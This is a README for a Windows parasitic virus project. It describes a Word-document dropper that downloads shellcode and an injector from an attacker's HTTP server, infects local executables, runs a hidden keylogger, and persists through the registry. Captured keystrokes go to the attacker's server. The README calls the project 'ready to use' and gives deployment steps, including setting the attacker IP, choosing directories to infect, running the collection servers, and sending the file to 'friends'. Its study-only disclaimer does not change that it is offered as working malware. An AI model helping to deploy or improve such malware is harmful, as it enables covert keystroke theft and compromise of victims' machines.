# ex(e)pert
Parasitic virus for windows.
My project is only for study purposes.

## How The Virus Works
The victim needs to download and open the word file, while opening the Microsoft Word file, 
Two files is being downloaded to the victim's computer, the shellcode and the injector from the http server.
Than, the infector infects one of the executable file on the victim's computer.
When the victim run's the infected executable file, my shellcode run in a different thread of the infected program.
And than, without the victim even notice, he's got keylogger running on his computer.
The infector get the infected program inside to the registry so it would run every time the victim turn on his computer.
The virus will get the keys pressed in the victim's computer and than will insert the data to a text file when the file name would be his ip.

## Why I Did This Project
I wanted to expand my knowledge about PE format, viruses and compiling and loading process.

## Project Status
The project is ready to use.

## How To Use
Pls don't use it for any bad reasons!!!
There is only some minor things that you should have to do when you want to use the project.
- Change the line below in the shellcode.c file and than update to your computer's ip, than compile the shellcode.c with the compile_shellcode.bat in 
 the visual studio command line
	```C
		char server_ip[] = { '1', '2', '7', '.', '0', '.', '0', '.', '1', 0 };
	```
- Change the line below in the infect_main.c file to where do you want the program to search executable files in the victim's computer:
	```C
		#define SEARCH_FROM_THERE_DIRECTORY "C:\\Users\\User\\source\\repos\\virus\\programs_to_infect"	
	```
- Run the two servers: udp_server.py and http_sever.py

- send the file to your friends :).